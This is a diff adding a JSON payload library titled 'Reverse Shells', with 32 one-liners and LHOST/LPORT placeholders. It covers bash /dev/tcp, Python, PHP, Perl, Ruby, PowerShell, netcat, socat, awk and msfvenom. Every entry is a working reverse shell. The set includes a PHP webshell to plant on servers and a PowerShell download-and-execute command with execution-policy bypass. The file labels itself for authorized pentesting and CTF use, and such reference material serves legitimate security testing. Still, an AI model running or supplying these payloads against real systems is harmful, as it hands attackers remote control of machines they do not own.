@@ -1,0 +1,52 @@
+{
+  "meta": {
+    "name": "Reverse Shells",
+    "icon": "🐚",
+    "description": "Reverse shell one-liners for common languages and tools. Replace LHOST with your listener IP and LPORT with your listener port. For use in authorized penetration testing, CTF competitions, and red team engagements only.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 32
+  },
+  "payloads": [
+    {"id":1,"code":"bash -i >& /dev/tcp/LHOST/LPORT 0>&1","description":"Bash TCP reverse shell — most widely supported bash variant","category":"bash","platform":["linux"],"tags":["bash","tcp","classic"]},
+    {"id":2,"code":"bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'","description":"Bash reverse shell wrapped in -c — useful when direct exec is needed","category":"bash","platform":["linux"],"tags":["bash","tcp","wrapped"]},
+    {"id":3,"code":"0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196","description":"Bash reverse shell using file descriptor 196 — avoids >& syntax","category":"bash","platform":["linux"],"tags":["bash","tcp","fd","bypass"]},
+    {"id":4,"code":"exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done","description":"Bash interactive TCP shell using while-read loop","category":"bash","platform":["linux"],"tags":["bash","tcp","loop"]},
+    {"id":5,"code":"bash -i 5<>/dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5","description":"Bash reverse shell via FD 5 with stderr redirect","category":"bash","platform":["linux"],"tags":["bash","tcp","fd"]},
+
+    {"id":6,"code":"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'","description":"Python3 reverse shell with PTY — fully interactive with pty.spawn","category":"python","platform":["linux","windows"],"tags":["python","python3","tcp","pty"]},
+    {"id":7,"code":"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'","description":"Compact Python3 PTY reverse shell using list comprehension","category":"python","platform":["linux"],"tags":["python","python3","compact","pty"]},
+    {"id":8,"code":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'","description":"Python2 reverse shell — for older systems without Python3","category":"python","platform":["linux"],"tags":["python","python2","subprocess"]},
+    {"id":9,"code":"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'","description":"Shortest Python3 reverse shell variant","category":"python","platform":["linux"],"tags":["python","python3","short"]},
+
+    {"id":10,"code":"php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'","description":"PHP reverse shell via fsockopen — runs /bin/sh on FD 3","category":"php","platform":["linux"],"tags":["php","fsockopen","tcp"]},
+    {"id":11,"code":"php -r '$sock=fsockopen(\"LHOST\",LPORT);$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'","description":"PHP reverse shell using proc_open — more reliable PTY variant","category":"php","platform":["linux"],"tags":["php","proc_open","tcp"]},
+    {"id":12,"code":"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\");?>","description":"PHP webshell reverse shell — place in PHP file on web server","category":"php","platform":["linux"],"tags":["php","webshell","bash"]},
+    {"id":13,"code":"php -r '$s=fsockopen(\"LHOST\",LPORT);while(!feof($s)){$c=fgets($s);system($c,$o);fwrite($s,implode(\"\\n\",$o));}'","description":"PHP reverse shell with output loop — sends command output back","category":"php","platform":["linux","windows"],"tags":["php","loop","tcp"]},
+
+    {"id":14,"code":"perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'","description":"Perl TCP reverse shell — classic one-liner using Socket module","category":"perl","platform":["linux"],"tags":["perl","socket","tcp","classic"]},
+    {"id":15,"code":"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"LHOST:LPORT\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","description":"Perl reverse shell via IO::Socket — fork-based for background operation","category":"perl","platform":["linux"],"tags":["perl","io-socket","fork"]},
+
+    {"id":16,"code":"ruby -rsocket -e'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'","description":"Ruby TCP reverse shell using TCPSocket","category":"ruby","platform":["linux"],"tags":["ruby","tcp","socket"]},
+    {"id":17,"code":"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"LHOST\",\"LPORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'","description":"Ruby reverse shell with fork and command loop","category":"ruby","platform":["linux"],"tags":["ruby","fork","tcp"]},
+
+    {"id":18,"code":"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"","description":"PowerShell TCP reverse shell — full interactive PS prompt over TCP","category":"powershell","platform":["windows"],"tags":["powershell","windows","tcp","interactive"]},
+    {"id":19,"code":"powershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://LHOST/shell.ps1')\"","description":"PowerShell download and execute — downloads and runs reverse shell script from HTTP","category":"powershell","platform":["windows"],"tags":["powershell","windows","download","bypass"]},
+    {"id":20,"code":"$client=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sb2=$sendback+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()","description":"Compact PowerShell reverse shell — same as above without -nop flag wrapper","category":"powershell","platform":["windows"],"tags":["powershell","windows","tcp","compact"]},
+
+    {"id":21,"code":"nc -e /bin/sh LHOST LPORT","description":"Netcat with -e flag — requires netcat-traditional (not openbsd variant)","category":"netcat","platform":["linux"],"tags":["netcat","nc","exec"]},
+    {"id":22,"code":"nc -c bash LHOST LPORT","description":"Netcat -c flag variant for some builds","category":"netcat","platform":["linux"],"tags":["netcat","nc","bash"]},
+    {"id":23,"code":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f","description":"Netcat mkfifo reverse shell — works with netcat OpenBSD variant (no -e flag)","category":"netcat","platform":["linux"],"tags":["netcat","mkfifo","openbsd","classic"]},
+    {"id":24,"code":"rm -f /tmp/f; mknod /tmp/f p && cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f","description":"Netcat named pipe (mknod) reverse shell — alternative to mkfifo","category":"netcat","platform":["linux"],"tags":["netcat","mknod","pipe"]},
+
+    {"id":25,"code":"socat TCP:LHOST:LPORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane","description":"Socat full PTY reverse shell — best interactive shell, proper terminal handling","category":"socat","platform":["linux"],"tags":["socat","pty","interactive","best"]},
+    {"id":26,"code":"socat TCP:LHOST:LPORT EXEC:bash","description":"Socat minimal reverse shell — simple bash exec over TCP","category":"socat","platform":["linux"],"tags":["socat","tcp","bash"]},
+    {"id":27,"code":"socat TCP:LHOST:LPORT EXEC:cmd.exe,pipes","description":"Socat Windows cmd.exe reverse shell","category":"socat","platform":["windows"],"tags":["socat","windows","cmd"]},
+
+    {"id":28,"code":"awk 'BEGIN{s=\"/inet/tcp/0/LHOST/LPORT\";while(42){do{printf \"shell>\" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!=\"exit\")close(s)}}'","description":"AWK reverse shell — useful when only awk is available on the target","category":"other","platform":["linux"],"tags":["awk","tcp","shell"]},
+    {"id":29,"code":"exec 3<>/dev/tcp/LHOST/LPORT;while read cmd <&3; do eval $cmd 2>&3 >&3; done","description":"Bash /dev/tcp exec loop — runs each line from socket as a command","category":"bash","platform":["linux"],"tags":["bash","tcp","eval","loop"]},
+    {"id":30,"code":"ncat LHOST LPORT -e /bin/bash","description":"Ncat (nmap version) reverse shell with -e exec","category":"netcat","platform":["linux"],"tags":["ncat","nmap","exec"]},
+    {"id":31,"code":"java -cp . Exploit","description":"Java compile+run — requires Exploit.java with runtime.exec() connecting back","category":"java","platform":["linux","windows"],"tags":["java","compile","generic"]},
+    {"id":32,"code":"msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf","description":"Metasploit msfvenom ELF payload — generates standalone Linux reverse shell binary","category":"other","platform":["linux"],"tags":["msfvenom","metasploit","elf","binary"]}
+  ]
+}
